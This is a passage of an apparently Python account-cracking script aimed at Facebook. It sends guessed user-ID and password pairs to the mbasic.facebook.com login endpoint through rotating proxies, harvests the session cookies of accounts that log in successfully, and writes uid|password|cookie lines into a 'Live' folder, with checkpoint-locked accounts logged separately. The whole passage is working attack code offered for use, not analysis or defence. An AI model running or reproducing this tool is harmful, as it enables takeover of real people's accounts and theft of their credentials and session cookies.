			po = ses.post(f"https://mbasic.facebook.com/login/device-based/regular/login/?api_key=1036341366506456&auth_token=4f320693831410338557ad22ead81389&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1036341366506456%26cbt%3D1691875771319%26e2e%3D%257B%2522init%2522%253A1691875771319%257D%26ies%3D1%26sdk%3Dandroid-12.3.0%26sso%3Dchrome_custom_tab%26nonce%3Dba5b8a3e-22f1-4572-9f83-eea66475502d%26scope%3Dopenid%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25222ec8f0a8-7804-4563-85bd-94cf063c4c7b%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25221g6mpqlj3d2765tu7dji%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.tencent.ig%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D2ec8f0a8-7804-4563-85bd-94cf063c4c7b%26tp%3Dunspecified&refsrc=deprecated&app_id=1036341366506456&cancel=fbconnect%3A%2F%2Fcct.com.tencent.ig%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25222ec8f0a8-7804-4563-85bd-94cf063c4c7b%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25221g6mpqlj3d2765tu7dji%2522%257D&lwv=101&locale2=id_ID&refid=9",data=data,headers=headers_post,proxies=proxs,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{P} * --> {H}{uid}{P}|{H}{pw}{P}|{H}{kuki}{P}")
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f"\r{P} * --> {K}{uid}{P}|{K}{pw}                           {P}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
if __name__=='__main__':
	try:os.mkdir('Live')
	except:pass
	try:os.mkdir('Chek')
	except:pass
	try:os.mkdir('Dump')
	except:pass
	menu()
